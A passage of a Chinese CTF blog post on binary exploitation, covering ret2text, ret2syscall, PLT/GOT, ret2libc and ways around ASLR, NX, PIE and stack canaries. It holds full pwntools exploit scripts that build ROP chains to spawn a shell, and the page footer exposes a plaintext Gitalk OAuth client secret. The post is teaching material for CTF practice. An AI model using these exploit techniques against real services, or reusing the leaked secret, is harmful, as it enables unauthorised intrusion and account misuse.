class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># backdoor = e.plt[&#x27;system&#x27;]</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]	<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    poprdi = <span class="number">0x4011eb</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(poprdi) + p64(bin_sh) + p64(backdoor)	<span class="comment"># 将当前rdi的值扔掉，bin_sh的地址赋给rdi，作为参数调用backdoor中的system</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<p>如果文件中没有system函数，如果想要调用system函数，要利用到PLT表。</p>
+<h2 id="7-2-Ret2syscall"><a href="#7-2-Ret2syscall" class="headerlink" title="7.2 Ret2syscall"></a>7.2 Ret2syscall</h2><ul>
+<li>一般为静态链接的可执行文件，指令非常多，也提供了许多gadget</li>
+</ul>
+<ul>
+<li>最核心gadget：syscall(int 0x80)</li>
+</ul>
+<ul>
+<li>整体类似Shellcode注入</li>
+</ul>
+<img src="/posts/undefined/7.2.1.png" class="" title="静动态链接">
+<p>静态链接的ELF文件在IDA的函数窗口全是一片白，没有粉色的动态链接。</p>
+<p>利用ROPgadget工具，自行生成ROP链。</p>
+<h2 id="7-3-PLT表和GOT表"><a href="#7-3-PLT表和GOT表" class="headerlink" title="7.3 PLT表和GOT表"></a>7.3 PLT表和GOT表</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52126646/article/details/119494939">GOT表和PLT表</a></p>
+<p>这里的PLT表示<code>.plt</code>，GOT表表示<code>.got.plt</code>。<code>.got</code>存放其它全局符号信息，与<code>.got.plt</code>不同，与<code>.plt</code>关系不大。</p>
+<h2 id="7-4-Ret2libc"><a href="#7-4-Ret2libc" class="headerlink" title="7.4 Ret2libc"></a>7.4 Ret2libc</h2><ul>
+<li>对动态链接文件，一般链接glibc</li>
+</ul>
+<ul>
+<li>glibc链接基址未知，需要进行基址泄露</li>
+</ul>
+<ul>
+<li>一般需要程序循环，可以通过ROP链构造循环</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400c83</span></span><br><span class="line">penc = <span class="number">0x4009a0</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b *0x4009d1\nb *0x400aee&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;choice&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(prdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(penc)	<span class="comment"># 泄露puts函数地址</span></span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)	</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;\x40\x0a&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;start detecting libc address&#x27;</span>)</span><br><span class="line">    libc_puts = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;libc puts address found:&#x27;</span> + <span class="built_in">hex</span>(libc_puts))</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts)</span><br><span class="line">    <span class="comment"># libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># libc.select_libc(0)</span></span><br><span class="line">    libc_addr = libc_puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    rtn_addr = <span class="number">0x400b27</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        payload += p64(rtn_addr)	<span class="comment"># for align</span></span><br><span class="line">    payload += p64(prdi) + p64(libc_addr + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)) + p64(libc_addr + libc.dump(<span class="string">&quot;system&quot;</span>))</span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="8-ELF保护措施及绕过方法"><a href="#8-ELF保护措施及绕过方法" class="headerlink" title="8. ELF保护措施及绕过方法"></a>8. ELF保护措施及绕过方法</h1><h2 id="8-1-ASLR"><a href="#8-1-ASLR" class="headerlink" title="8.1 ASLR"></a>8.1 ASLR</h2><p>ASLR(Address space layout randomization)——地址空间配置随机化</p>
+<p>将可执行文件、共享库、栈、堆的基址随机化，用于防范明确地址的内存破坏攻击，比如ret2libc、stack address。</p>
+<p>应对方法：地址泄露</p>
+<h2 id="8-2-NX"><a href="#8-2-NX" class="headerlink" title="8.2 NX"></a>8.2 NX</h2><p>看[7.ROP链构造]</p>
+<h2 id="8-3-PIE"><a href="#8-3-PIE" class="headerlink" title="8.3 PIE"></a>8.3 PIE</h2><p>PIE(Position-independent executable)——地址无关代码/可执行文件</p>
+<p>无论文件被加载进内存空间的什么地址中，程序都能够正常运行。在共享库链接中有重要作用。共享库文件被动态链接到内存中，PIE使其能正确处理外部引用。在普通ELF文件上，ELF配合ASLR，使其基址不可预测，增加了攻击难度。</p>
+<p>整个ELF文件都会被装载进一个随机偏移的连续内存空间里，只有基址变成了未知，其它都是相同的。</p>
+<p>应对方法：Partial Writing</p>
+<p>程序的加载以内存页(4K)为单位，基地址后3位(hex)一定为0，同一文件被加载进连续地址中。</p>
+<p>一般利用Return Address控制跳转，可通过栈上已有地址，只修改最低3位(2B，4位)值，控制转向</p>
+<h2 id="8-4-Canary"><a href="#8-4-Canary" class="headerlink" title="8.4 Canary"></a>8.4 Canary</h2><p>Canary(Canary in a coal mine)——金丝雀</p>
+<p>一串随机数据，放置在栈数据和控制信息之间，函数开始时被放入，退出前检验，若被修改立即终止程序，极大地防范了栈溢出攻击。</p>
+<p>应对方法：Canary Leak</p>
+<ul>
+<li>覆盖栈到Canary处，利用puts等函数泄露地址</li>
+<li>Canary最低字节为0，防止连带输出</li>
+</ul>
+<p>小技巧：<code>scanf(&quot;%d&quot;);</code>输入”+”不覆盖内存数据</p>
+<h1 id="9-Stack-Pivot"><a href="#9-Stack-Pivot" class="headerlink" title="9. Stack Pivot"></a>9. Stack Pivot</h1><p>假如可供泄露空间过少，或者需要整段可控的栈空间，这就需要使栈帧移向可控栈空间，控制程序执行流转向。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="v5le0n9 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="v5le0n9 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/Pwn/" rel="tag"><i class="fa fa-tag"></i> Pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/9589547b.html" rel="prev" title="黑客丛林之旅小游戏">
+      <i class="fa fa-chevron-left"></i> 黑客丛林之旅小游戏
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Linux%E5%85%A5%E9%97%A8"><span class="nav-text">1. Linux入门</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="nav-text">2. 汇编基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E4%B8%8E%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="nav-text">3. 程序装载与栈帧结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E5%AE%9E%E6%88%98%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%92%8C%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="nav-text">4. 实战环境配置和工具介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-text">5. 缓冲区溢出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-Shellcode"><span class="nav-text">6. Shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-ROP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-text">7. ROP链构造</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#7-1-Ret2Text"><span class="nav-text">7.1 Ret2Text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-2-Ret2syscall"><span class="nav-text">7.2 Ret2syscall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-3-PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8"><span class="nav-text">7.3 PLT表和GOT表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-4-Ret2libc"><span class="nav-text">7.4 Ret2libc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-ELF%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">8. ELF保护措施及绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#8-1-ASLR"><span class="nav-text">8.1 ASLR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-2-NX"><span class="nav-text">8.2 NX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-3-PIE"><span class="nav-text">8.3 PIE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-4-Canary"><span class="nav-text">8.4 Canary</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9-Stack-Pivot"><span class="nav-text">9. Stack Pivot</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="v5le0n9"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">v5le0n9</p>
+  <div class="site-description" itemprop="description">v5le0n9's garden</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/Leong_Vinson" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leong_Vinson" rel="noopener" target="_blank"><i class="fab fa-cuttlefish fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/v5le0n9" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;v5le0n9" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:v5le0n9@163.com" title="E-Mail → mailto:v5le0n9@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v5le0n9</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">669k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">10:08</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '7c58e80079a2457b610d',
+      clientSecret: 'fc16b1b0fdfb278016ebe41c20f3743c3c927466',
+      repo        : 'comments.github.io',
+      owner       : 'v5le0n9',
+      admin       : ['v5le0n9'],
+      id          : '4dc2eeccabf80e00c540561727216e0c',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
